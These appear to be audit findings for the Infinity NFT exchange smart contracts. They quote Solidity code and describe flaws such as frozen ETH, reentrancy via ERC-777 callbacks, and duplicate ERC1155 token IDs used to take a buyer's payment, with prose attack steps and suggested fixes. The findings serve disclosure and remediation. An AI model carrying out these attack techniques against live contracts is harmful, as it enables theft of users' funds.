# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L323-L327 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L359-L363   # Vulnerability details  takeOrders() and takeMultipleOneOrders() are the main user facing functionality of the protocol. Both require `currency` to be fixed for the call and can have it either as a ERC20 token or ETH. This way, the probability of a user sending over a ETH with the call whose `currency` is a ERC20 token isn't negligible. However, in this case ETH funds of a user will be permanently lost.  Setting the severity to medium as this is permanent fund freeze scenario conditional on a user mistake, which probability can be deemed high enough as the same functions are used for ETH and ERC20 orders.  ## Proof of Concept  Both takeOrders() and takeMultipleOneOrders() only check that ETH funds are enough to cover the order's `totalPrice`:  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L323-L327  ```solidity     // check to ensure that for ETH orders, enough ETH is sent     // for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sent     if (isMakerSeller && currency == address(0)) {       require(msg.value >= totalPrice, 'invalid total price');     } ```  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L359-L363  ```solidity     // check to ensure that for ETH orders, enough ETH is sent     // for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sent     if (isMakerSeller && currency == address(0)) {       require(msg.value >= totalPrice, 'invalid total price');     } ```  When `currency` is some ERC20 token, while `msg.value > 0`, the `msg.value` will be permanently frozen within the contract.  ## Recommended Mitigation Steps  Consider adding the check for `msg.value` to be zero for the cases when it is not utilized:  ```solidity     // check to ensure that for ETH orders, enough ETH is sent     // for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sent     if (isMakerSeller && currency == address(0)) {       require(msg.value >= totalPrice, 'invalid total price');     } else {       require(msg.value == 0, 'non-zero ETH value');     } ```  
# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1228-L1232   # Vulnerability details  ETH fees accumulated from takeOrders() and takeMultipleOneOrders() operations are permanently frozen within the contract as there is only one way designed to retrieve them, a rescueETH() function, and it will work as intended, not being able to access ETH balance of the contract.  Setting the severity as high as the case is a violation of system's core logic and a permanent freeze of ETH revenue of the project.  ## Proof of Concept  Fees are accrued in user-facing takeOrders() and takeMultipleOneOrders() via the following call sequences:  ``` takeOrders -> _takeOrders -> _execTakeOrders -> _transferNFTsAndFees -> _transferFees takeMultipleOneOrders -> _execTakeOneOrder -> _transferNFTsAndFees -> _transferFees ```  While token fees are transferred right away, ETH fees are kept with the InfinityExchange contract:  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1119-L1141  ```solidity   /**    * @notice Transfer fees. Fees are always transferred from buyer to the seller and the exchange although seller is              the one that actually 'pays' the fees    * @dev if the currency ETH, no additional transfer is needed to pay exchange fees since the contract is 'payable'    * @param seller the seller    * @param buyer the buyer    * @param amount amount to transfer    * @param currency currency of the transfer    */   function _transferFees(     address seller,     address buyer,     uint256 amount,     address currency   ) internal {     // protocol fee     uint256 protocolFee = (PROTOCOL_FEE_BPS * amount) / 10000;     uint256 remainingAmount = amount - protocolFee;     // ETH     if (currency == address(0)) {       // transfer amount to seller       (bool sent, ) = seller.call{value: remainingAmount}('');       require(sent, 'failed to send ether to seller'); ```  I.e. when `currency` is ETH the fee part of the amount, `protocolFee`, is left with the InfinityExchange contract.  The only way to retrieve ETH from the contract is rescueETH() function:  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1228-L1232  ```solidity   /// @dev used for rescuing exchange fees paid to the contract in ETH   function rescueETH(address destination) external payable onlyOwner {     (bool sent, ) = destination.call{value: msg.value}('');     require(sent, 'failed');   } ```  However, it cannot reach ETH on the contract balance as `msg.value` is used as the amount to be sent over. I.e. only ETH attached to the rescueETH() call is transferred from `owner` to `destination`. ETH funds that InfinityExchange contract holds remain inaccessible.  ## Recommended Mitigation Steps  Consider adding contract balance to the funds transferred:  ```solidity   /// @dev used for rescuing exchange fees paid to the contract in ETH   function rescueETH(address destination) external payable onlyOwner { -   (bool sent, ) = destination.call{value: msg.value}(''); +   (bool sent, ) = destination.call{value: address(this).balance}('');     require(sent, 'failed');   } ```  
# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L68-L116   # Vulnerability details  The call stack: matchOneToManyOrders() -> _matchOneMakerSellToManyMakerBuys() -> _execMatchOneMakerSellToManyMakerBuys() -> _execMatchOneToManyOrders() -> _transferMultipleNFTs()  Based on the context, a maker buy order can set `OrderItem.tokens` as an empty array to indicate that they can accept any tokenId in this collection, in that case, `InfinityOrderBookComplication.doTokenIdsIntersect()` will always return `true`.  However, when the system matching a sell order with many buy orders, the `InfinityOrderBookComplication` contract only ensures that the specified tokenIds intersect with the sell order, and the total count of specified tokenIds equals the sell order's quantity (`makerOrder.constraints[0]`).  This allows any maker buy order with same collection and `empty tokenIds` to be added to `manyMakerOrders` as long as there is another maker buy order with specified tokenIds that matched the sell order's tokenIds.  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L68-L116  ```solidity function canExecMatchOneToMany(     OrderTypes.MakerOrder calldata makerOrder,     OrderTypes.MakerOrder[] calldata manyMakerOrders   ) external view override returns (bool) {     uint256 numItems;     bool isOrdersTimeValid = true;     bool itemsIntersect = true;     uint256 ordersLength = manyMakerOrders.length;     for (uint256 i = 0; i < ordersLength; ) {       if (!isOrdersTimeValid || !itemsIntersect) {         return false; // short circuit       }        uint256 nftsLength = manyMakerOrders[i].nfts.length;       for (uint256 j = 0; j < nftsLength; ) {         numItems += manyMakerOrders[i].nfts[j].tokens.length;         unchecked {           ++j;         }       }        isOrdersTimeValid =         isOrdersTimeValid &&         manyMakerOrders[i].constraints[3] <= block.timestamp &&         manyMakerOrders[i].constraints[4] >= block.timestamp;        itemsIntersect = itemsIntersect && doItemsIntersect(makerOrder.nfts, manyMakerOrders[i].nfts);        unchecked {         ++i;       }     }      bool _isTimeValid = isOrdersTimeValid &&       makerOrder.constraints[3] <= block.timestamp &&       makerOrder.constraints[4] >= block.timestamp;      uint256 currentMakerOrderPrice = _getCurrentPrice(makerOrder);     uint256 sumCurrentOrderPrices = _sumCurrentPrices(manyMakerOrders);      bool _isPriceValid = false;     if (makerOrder.isSellOrder) {       _isPriceValid = sumCurrentOrderPrices >= currentMakerOrderPrice;     } else {       _isPriceValid = sumCurrentOrderPrices <= currentMakerOrderPrice;     }      return (numItems == makerOrder.constraints[0]) && _isTimeValid && itemsIntersect && _isPriceValid;   } ```  However, because `buy.nfts` is used as `OrderItem` to transfer the nfts from seller to buyer, and there are no tokenIds specified in the matched maker buy order, the buyer wont receive any nft (`_transferERC721s` does nothing, 0 transfers) despite the buyer paid full in price.  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L763-L786  ```solidity function _execMatchOneMakerSellToManyMakerBuys(     bytes32 sellOrderHash,     bytes32 buyOrderHash,     OrderTypes.MakerOrder calldata sell,     OrderTypes.MakerOrder calldata buy,     uint256 startGasPerOrder,     uint256 execPrice,     uint16 protocolFeeBps,     uint32 wethTransferGasUnits,     address weth   ) internal {     isUserOrderNonceExecutedOrCancelled[buy.signer][buy.constraints[5]] = true;     uint256 protocolFee = (protocolFeeBps * execPrice) / 10000;     uint256 remainingAmount = execPrice - protocolFee;     _execMatchOneToManyOrders(sell.signer, buy.signer, buy.nfts, buy.execParams[1], remainingAmount);     _emitMatchEvent(       sellOrderHash,       buyOrderHash,       sell.signer,       buy.signer,       buy.execParams[0],       buy.execParams[1],       execPrice     ); ```  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1080-L1092  ```solidity function _transferERC721s(     address from,     address to,     OrderTypes.OrderItem calldata item   ) internal {     uint256 numTokens = item.tokens.length;     for (uint256 i = 0; i < numTokens; ) {       IERC721(item.collection).safeTransferFrom(from, to, item.tokens[i].tokenId);       unchecked {         ++i;       }     }   } ```   ### PoC  1. Alice signed and submitted a maker buy order #1, to buy `2` Punk with `2 WETH` and specified tokenIds = `1`,`2` 2. Bob signed and submitted a maker buy order #2, to buy `1` Punk with `1 WETH` and with no specified tokenIds. 3. Charlie signed and submitted a maker sell order #3, ask for `3 WETH` for `2` Punk and specified tokenIds = `1`,`2` 4. The match executor called `matchOneToManyOrders()` match Charlie's sell order #3 with buy order #1 and #2, Alice received `2` Punk, Charlie received `3 WETH`, Bob paid `1 WETH` and get nothing in return.  ### Recommendation  Change to:  ```solidity function canExecMatchOneToMany(     OrderTypes.MakerOrder calldata makerOrder,     OrderTypes.MakerOrder[] calldata manyMakerOrders   ) external view override returns (bool) {     uint256 numItems;     uint256 numConstructedItems;     bool isOrdersTimeValid = true;     bool itemsIntersect = true;     uint256 ordersLength = manyMakerOrders.length;     for (uint256 i = 0; i < ordersLength; ) {       if (!isOrdersTimeValid || !itemsIntersect) {         return false; // short circuit       }        numConstructedItems += manyMakerOrders[i].constraints[0];        uint256 nftsLength = manyMakerOrders[i].nfts.length;       for (uint256 j = 0; j < nftsLength; ) {         numItems += manyMakerOrders[i].nfts[j].tokens.length;         unchecked {           ++j;         }       }        isOrdersTimeValid =         isOrdersTimeValid &&         manyMakerOrders[i].constraints[3] <= block.timestamp &&         manyMakerOrders[i].constraints[4] >= block.timestamp;        itemsIntersect = itemsIntersect && doItemsIntersect(makerOrder.nfts, manyMakerOrders[i].nfts);        unchecked {         ++i;       }     }      bool _isTimeValid = isOrdersTimeValid &&       makerOrder.constraints[3] <= block.timestamp &&       makerOrder.constraints[4] >= block.timestamp;      uint256 currentMakerOrderPrice = _getCurrentPrice(makerOrder);     uint256 sumCurrentOrderPrices = _sumCurrentPrices(manyMakerOrders);      bool _isPriceValid = false;     if (makerOrder.isSellOrder) {       _isPriceValid = sumCurrentOrderPrices >= currentMakerOrderPrice;     } else {       _isPriceValid = sumCurrentOrderPrices <= currentMakerOrderPrice;     }      return (numItems == makerOrder.constraints[0]) && (numConstructedItems == numItems) && _isTimeValid && itemsIntersect && _isPriceValid;   } ```  
# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L119-L121 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1228-L1232   # Vulnerability details  `InfinityExchange` accepts payments in native ETH, but does not return overpayments to the buyer. Overpayments are likely in the case of auction orders priced in native ETH.  In the case of a Dutch or reverse Dutch auction priced in native ETH, the end user is likely to send more ETH than the final calculated price in order to ensure their transaction succeeds, since price is a function of `block.timestamp`, and the user cannot predict the timestamp at which their transaction will be included.   In a Dutch auction, final price may decrease below the calculated price at the time the transaction is sent. In a reverse Dutch auction, the price may increase above the calculated price by the time a transaction is included, so the buyer is incentivized to provide additional ETH in case the price rises while their transaction is waiting for inclusion.  The `takeOrders` and `takeMultipleOneOrders` functions both check that the buyer has provided an ETH amount greater than or equal to the total price at the time of execution:  [`InfinityExchange#takeOrders`](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L359-L363)  ```solidity     // check to ensure that for ETH orders, enough ETH is sent     // for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sent     if (isMakerSeller && currency == address(0)) {       require(msg.value >= totalPrice, 'invalid total price');     } ```  [`InfinityExchange#takeMultipleOneOrders`](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L323-L327)  ```solidity     // check to ensure that for ETH orders, enough ETH is sent     // for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sent     if (isMakerSeller && currency == address(0)) {       require(msg.value >= totalPrice, 'invalid total price');     } ```  However, neither of these functions refunds the user in the case of overpayment. Instead, overpayment amounts will accrue in the contract balance.  Moreover, since there is a bug in `rescueETH` that prevents ether withdrawals from `InfinityExchange`, these overpayments will be locked permanently: the owner cannot withdraw and refund overpayments manually.  Scenario: - Alice creates a sell order for her token with constraints that set up a reverse Dutch auction: start price `500`, end price `2000`, start time `1`, end time `5`. - Bob fills the order at time `2`. The calculated price is `875`. Bob is unsure when his transaction will be included, so provides a full `2000` wei payment. - Bob's transaction is included at time `3`. The calculated price is `1250`. - Bob's additional `750` wei are locked in the contract and not refunded.  Suggestion: Calculate and refund overpayment amounts to callers.  
# Summary  We list 2 low-critical findings: * (Low) Misunderstanding params * (Low) `takeMultipleOneOrders` doesn’t check nfts length  # (Low) Misunderstanding params  ## Impact  `constraints` in struct MakerOrder is an array which is easily misused.  ## Proof of Concept  It hard coded a number to indicate an element in `constraints` array:  https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L515-L516  ```     bool orderExpired = isUserOrderNonceExecutedOrCancelled[order.signer][order.constraints[5]] ||       order.constraints[5] < userMinOrderNonce[order.signer]; ```  ## Tools Used  None  ## Recommended Mitigation Steps  Consider to define variables rather than `constraints` array, or use constraint index to indicate:  ```     enum CONSTRAINT_INDEX {         numItems,         startPrice,         endPrice,         startTime,         endTime,         nonce     } ```  # (Low) `takeMultipleOneOrders` doesn’t check nfts length  ## Impact  In `matchOneToOneOrders`, it checks that the `nfts` of orders must be 1: https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityOrderBookComplication.sol#L32-L37  But in `takeMultipleOneOrders`, it doesn’t check that the `nfts` of orders must be 1, and the comment says: Batch buys or sells orders with specific `1` NFTs.  ## Tools Used  None  ## Recommended Mitigation Steps  Also check nfts length in `​​takeMultipleOneOrders`. 
# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L178 https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L216 https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L230   # Vulnerability details  `matchOneToManyOrders` doesn't conform to Checks-Effects-Interactions pattern, and updates the maker order nonce only after the NFTs and payment have been sent. Using this, a malicious user can re-enter the contract and re-fulfill the order using `takeOrders`.  ## Impact Orders can be executed twice. User funds would be lost.  ## Proof of Concept `matchOneToManyOrders` will set the order nonce as used only after the tokens are being sent: ```   function matchOneToManyOrders(OrderTypes.MakerOrder calldata makerOrder, OrderTypes.MakerOrder[] calldata manyMakerOrders) external {     ...     if (makerOrder.isSellOrder) {       for (uint256 i = 0; i < ordersLength; ) {         ...         _matchOneMakerSellToManyMakerBuys(...); // @audit will transfer tokens in here         ...       }       //@audit setting nonce to be used only here       isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;     } else {       for (uint256 i = 0; i < ordersLength; ) {         protocolFee += _matchOneMakerBuyToManyMakerSells(...); // @audit will transfer tokens in here         ...       }       //@audit setting nonce to be used only here       isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;       ...   } ```  So we can see that tokens are being transferred before nonce is being set to executed.  Therefore, POC for an attack - Alice wants to buy 2 unspecified WolfNFT, and she will pay via AMP, an ERC-777 token. Malicious user Bob will set up an offer to sell 2 WolfNFT. The MATCH_EXECUTOR will match the offers. Bob will set up a contract such that upon receiving of AMP, it will call [`takeOrders`](https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L336) with Alice's order, and 2 other WolfNFTs. (Note that although `takeOrders` is `nonReentrant`, `matchOneToManyOrders` is not, and so the reentrancy will succeed.)  So in `takeOrders`, the contract will match Alice's order with Bob's NFTs, and then set Alice's order's nonce to true, then `matchOneToManyOrders` execution will resume, and again will set Alice's order's nonce to true.  Alice ended up buying 4 WolfNFTs although she only signed an order for 2. Tough luck, Alice.  (Note: a similar attack can be constructed via ERC721's onERC721Received.)  ## Recommended Mitigation Steps Conform to CEI and set the nonce to true before executing external calls.  
# Lines of code  https://github.com/infinitydotxyz/exchange-contracts-v2/blob/c51b7e8af6f95cc0a3b5489369cbc7cee060434b/contracts/core/InfinityOrderBookComplication.sol#L205   # Vulnerability details  ## Impact  Function `matchOrders` uses custom constraints to make the matching more flexible, allow seller/buyer to specify maximum/minimum number of NFTs they want to sell/buy. This function first does some checks and then execute matching.  But in [function](https://github.com/infinitydotxyz/exchange-contracts-v2/blob/c51b7e8af6f95cc0a3b5489369cbc7cee060434b/contracts/core/InfinityOrderBookComplication.sol#L192) `areNumItemsValid()`, there is a wrong checking will lead to wrong logic in `matchOrders()` function.  Instead of checking if `numConstructedItems <= sell.constraints[0]` or not, function `areNumItemsValid()` check if `buy.constraints[0] <= sell.constraints[0]`. It will lead to the scenario that `numConstructedItems > sell.constraints[0]` and make the seller sell more number of nfts than he/she allow.    ## Proof of concept   Consider the scenario 1. Alice create a sell order to sell maximum 2 in her 3 BAYC with ids `[1, 2, 3]`  2. Bob create a buy order to buy mimimum any 2 BAYC with id in list `[1, 2, 3]` 3. Match executor call `matchOrders()` to match Alice's order and Bob's one with parameter `constructs = [1, 2, 3]`  4. Function `matchOrders` will transfer all NFT in `construct` list (3 NFTs `1, 2, 3`) from seller to buyer even though seller only want to sell maximum 2 NFTs.  For more information, please check this PoC.  https://gist.github.com/minhquanym/a95c8652de8431c5d1d24aa4076a1878           ## Tools Used  hardhat, chai      ## Recommended Mitigation Steps  Replace check `buy.constraints[0] <= sell.constraints[0]` with `numConstructedItems <= sell.constraints[0]`  
# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L271-L312 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L59-L116 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L245-L294 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L118-L143 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L330-L364 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L934-L951 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L145-L164 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L171-L243   # Vulnerability details  ## Impact Function `matchOneToManyOrders()` and `takeOrders()` and `matchOrders()` suppose to match `sell order` to `buy order` and should perform some checks to ensure that user specified parameters in orders which are signed are not violated when order matching happens. but There is no check in their execution flow to check that an `order` has different `NFT token ids` in each one of it's collections, so even so number of tokens could be valid in `order` to `order` transfer but the number of real transferred tokens and their IDs can be different than what user specified and signed. and user funds would be lost. (because of `ERC1155` there can be more than one token for a `tokenId`, so it would be possible to transfer it)  ## Proof of Concept This is `_takeOrders()` and `` and `` code: ```   /**    * @notice Internal helper function to take orders    * @dev verifies whether order can be executed    * @param makerOrder the maker order    * @param takerItems nfts to be transferred    * @param execPrice execution price    */   function _takeOrders(     OrderTypes.MakerOrder calldata makerOrder,     OrderTypes.OrderItem[] calldata takerItems,     uint256 execPrice   ) internal {     bytes32 makerOrderHash = _hash(makerOrder);     bool makerOrderValid = isOrderValid(makerOrder, makerOrderHash);     bool executionValid = IComplication(makerOrder.execParams[0]).canExecTakeOrder(makerOrder, takerItems);     require(makerOrderValid && executionValid, 'order not verified');     _execTakeOrders(makerOrderHash, makerOrder, takerItems, makerOrder.isSellOrder, execPrice);   } ``` As you can see it uses `canExecTakeOrder()` to check that it is valid to perform matching. This is `canExecTakeOrder()` and `areTakerNumItemsValid()` and `doTokenIdsIntersect()` code which are used in execution flow to check orders and matching validity: ```   /**    * @notice Checks whether take orders with a higher order intent can be executed    * @dev This function is called by the main exchange to check whether take orders with a higher order intent can be executed.           It checks whether orders have the right constraints - i.e they have the right number of items, whether time is still valid           and whether the nfts intersect    * @param makerOrder the maker order    * @param takerItems the taker items specified by the taker    * @return returns whether order can be executed    */   function canExecTakeOrder(OrderTypes.MakerOrder calldata makerOrder, OrderTypes.OrderItem[] calldata takerItems)     external     view     override     returns (bool)   {     return (makerOrder.constraints[3] <= block.timestamp &&       makerOrder.constraints[4] >= block.timestamp &&       areTakerNumItemsValid(makerOrder, takerItems) &&       doItemsIntersect(makerOrder.nfts, takerItems));   }    /// @dev sanity check to make sure that a taker is specifying the right number of items   function areTakerNumItemsValid(OrderTypes.MakerOrder calldata makerOrder, OrderTypes.OrderItem[] calldata takerItems)     public     pure     returns (bool)   {     uint256 numTakerItems = 0;     uint256 nftsLength = takerItems.length;     for (uint256 i = 0; i < nftsLength; ) {       unchecked {         numTakerItems += takerItems[i].tokens.length;         ++i;       }     }     return makerOrder.constraints[0] == numTakerItems;   }    /**    * @notice Checks whether tokenIds intersect    * @dev This function checks whether there are intersecting tokenIds between two order items    * @param item1 first item    * @param item2 second item    * @return returns whether tokenIds intersect    */   function doTokenIdsIntersect(OrderTypes.OrderItem calldata item1, OrderTypes.OrderItem calldata item2)     public     pure     returns (bool)   {     uint256 item1TokensLength = item1.tokens.length;     uint256 item2TokensLength = item2.tokens.length;     // case where maker/taker didn't specify any tokenIds for this collection     if (item1TokensLength == 0 || item2TokensLength == 0) {       return true;     }     uint256 numTokenIdsPerCollMatched = 0;     for (uint256 k = 0; k < item2TokensLength; ) {       for (uint256 l = 0; l < item1TokensLength; ) {         if (           item1.tokens[l].tokenId == item2.tokens[k].tokenId && item1.tokens[l].numTokens == item2.tokens[k].numTokens         ) {           // increment numTokenIdsPerCollMatched           unchecked {             ++numTokenIdsPerCollMatched;           }           // short circuit           break;         }         unchecked {           ++l;         }       }       unchecked {         ++k;       }     }      return numTokenIdsPerCollMatched == item2TokensLength;   } ``` As you can see there is no logic to check that `token IDs` in one collection of order are different and code only checks that total number of tokens in one `order` matches the number of tokens specified and the ids in one order exists in other list defined. function `doTokenIdsIntersect()` checks to see that `tokens ids` in one collection can match list of specified tokens. because of this check lacking there are some scenarios that can cause fund lose for `ERC1155` tokens (normal `ERC721` requires more strange conditions). here is first example:  1. for simplicity let's assume collection and timestamp are valid and match for orders and token is `ERC1155` 2. `user1` has signed this order: A:`(user1 BUY 3 NFT IDs[(1,1),(2,1),(3,1)] at 15 ETH)` (buy `1` token of each `id=1,2,3`) 3. `NFT ID[1]` fair price is `1 ETH`, `NFT ID[2]` fair price is `2 ETH`, `NFT ID[3]` fair price is `12 ETH` 4. `attacker` who has 3 of `NFT ID[1]` create this list: B:`(NFT IDs[(1,1), (1,1), (1,1)] )` (list to trade `1`token of `id=1` for 3 times) 5. attacker call `takeOrders()` with this parameters: makerOrder: A , takerNfts: B 6. contract logic would check all the conditions and validate and verify orders and their matching (they intersect and total number of token to sell is equal to total number of tokens to buy and all of the B list is inside A list) and perform the transaction. 7. `attacker` would receive `15 ETH` for his 3 token of `NFT ID[1]` and steal `user1` funds. `user1` would receive 3 of `NFT ID[1]` and pays `15 ETH` and even so his order A has been executed he doesn't receive `NFT IDs[(2,1),(3,1)]` and contract would violates his signed parameters.  This examples shows that in verifying one to many order code should verify that one order's one  collection's token ids are not duplicates. (the function `doTokenIdsIntersect()` doesn't check for this).  This scenario is performable to `matchOneToManyOrders()` and `matchOrders()` and but exists in their code (related check logics) too. more important things about this scenario is that it doesn't require off-chain maching engine to make mistake or malicious act, anyone can call `takeOrders()` if NFT tokens are `ERC1155`. for other `NFT` tokens to perform this attack it requires that `seller==buyer` or some other strange cases (like auto selling when receiving in one contract).  ## Tools Used VIM  ## Recommended Mitigation Steps add checks to ensure `order`'s one `collection`'s token ids are not duplicate in `doTokenIdsIntersect()`  
# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L125-L364   # Vulnerability details  ## Impact Functions `matchOneToOneOrders()`, `matchOneToManyOrders()`, `matchOrders()`, `takeMultipleOneOrders()`, `takeOrders()` are for order matching and order execution and they validate different things about orders but there is no check for that `seller != buyer`, which can cause wrong order matching resulting in fund lose or fund theft or griefing. (it can be combined with other vulns to perform more damaging attacks)  ## Proof of Concept We only give proof of concept for `matchOneToManyOrders()` and other order execution/matching functions has similar bugs which root cause is not checking `seller != buyer`. This is `matchOneToManyOrders()` code: ```   /**    @notice Matches one  order to many orders. Example: A buy order with 5 specific NFTs with 5 sell orders with those specific NFTs.    @dev Can only be called by the match executor. Refunds gas cost incurred by the         match executor to this contract. Checks whether the given complication can execute the match.    @param makerOrder The one order to match    @param manyMakerOrders Array of multiple orders to match the one order against   */   function matchOneToManyOrders(     OrderTypes.MakerOrder calldata makerOrder,     OrderTypes.MakerOrder[] calldata manyMakerOrders   ) external {     uint256 startGas = gasleft();     require(msg.sender == MATCH_EXECUTOR, 'OME');     require(_complications.contains(makerOrder.execParams[0]), 'invalid complication');     require(       IComplication(makerOrder.execParams[0]).canExecMatchOneToMany(makerOrder, manyMakerOrders),       'cannot execute'     );     bytes32 makerOrderHash = _hash(makerOrder);     require(isOrderValid(makerOrder, makerOrderHash), 'invalid maker order');     uint256 ordersLength = manyMakerOrders.length;     // the below 3 variables are copied to memory once to save on gas     // an SLOAD costs minimum 100 gas where an MLOAD only costs minimum 3 gas     // since these values won't change during function execution, we can save on gas by copying them to memory once     // instead of SLOADing once for each loop iteration     uint16 protocolFeeBps = PROTOCOL_FEE_BPS;     uint32 wethTransferGasUnits = WETH_TRANSFER_GAS_UNITS;     address weth = WETH;     if (makerOrder.isSellOrder) {       for (uint256 i = 0; i < ordersLength; ) {         // 20000 for the SSTORE op that updates maker nonce status from zero to a non zero status         uint256 startGasPerOrder = gasleft() + ((startGas + 20000 - gasleft()) / ordersLength);         _matchOneMakerSellToManyMakerBuys(           makerOrderHash,           makerOrder,           manyMakerOrders[i],           startGasPerOrder,           protocolFeeBps,           wethTransferGasUnits,           weth         );         unchecked {           ++i;         }       }       isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;     } else {       uint256 protocolFee;       for (uint256 i = 0; i < ordersLength; ) {         protocolFee += _matchOneMakerBuyToManyMakerSells(           makerOrderHash,           manyMakerOrders[i],           makerOrder,           protocolFeeBps         );         unchecked {           ++i;         }       }       isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;       uint256 gasCost = (startGas - gasleft() + WETH_TRANSFER_GAS_UNITS) * tx.gasprice;       // if the execution currency is weth, we can send the protocol fee and gas cost in one transfer to save gas       // else we need to send the protocol fee separately in the execution currency       // since the buyer is common across many sell orders, this part can be executed outside the above for loop       // in contrast to the case where if the one order is a sell order, we need to do this in each for loop       if (makerOrder.execParams[1] == weth) {         IERC20(weth).safeTransferFrom(makerOrder.signer, address(this), protocolFee + gasCost);       } else {         IERC20(makerOrder.execParams[1]).safeTransferFrom(makerOrder.signer, address(this), protocolFee);         IERC20(weth).safeTransferFrom(makerOrder.signer, address(this), gasCost);       }     }   } ``` in its executions it calls `InfinityOrderBookComplication.canExecMatchOneToMany()`, `verifyMatchOneToManyOrders()`, `isOrderValid()` to see that if orders are valid and one order matched to all other orders but there is no check for `seller != buyer` in any of those functions. and also `ERC721` and `ERC20` allows funds and assets to be transferred from address to itself. So it's possible for `matchOneToManyOrders()` to match one user sell orders to its buy orders which can cause fund theft or griefing. This is the scenario for fund lose in `matchOneToManyOrders()`: 1. let's assume orders `NFT` ids are for one collection for simplicity. 2. `NFT ID[1]` fair price is `8 ETH` and `NFT ID[2]` fair price is `2 ETH`. 3. `user1` wants to buy `NFT IDs[1,2]` at `10 ETH` (both of them) so he create one buy order and signs it. 4. `user1` wants to sell `NFT ID[1]` at `2.5 ETH` and sell `NFT ID[2]` at `8.5 ETH`. and he wants to sell them immediately after buying them so he create this two sell orders and sign them. 5. `attacker` who has `NFT ID[1]` creates an sell order for it at `7.5 ETH` and signs it. 6. off-chain machining engine sends this orders to `matchOneToManyOrders()`: many orders = [`(attacker sell ID[1] at 7.5 ETH)` , `(user1 sell ID[1] at 2.5 ETH)`] , one order = `(user1 buy IDs[1,2] at 10ETH)` 7. function `matchOneToManyOrders()` logic will check orders and their matching and all the checks would be passed for matching one order to many order(becase tokens lists intersects and numTokens are valids too (`1+1=2`)) 8. function `matchOneToManyOrders()` would execute order and transfer funds and tokens which would result in: (transferring `7.5 ETH` from `user 1` to `attacker`) (transferring `2.5 ETH` from `user1` to `user1`) (transferring `NFT ID[1]` from `attacker` to `user1`) (transferring `NFT ID[1]` from `user1` to `user1`) 9. so in the end contract executed `user1` buy order `(user1 buy IDs[1,2] at 10ETH)` but `user` only received `NFT ID[1]` and didn't received `NFT ID[2]` so contract code perform operation contradiction to what `user1` has been signed.  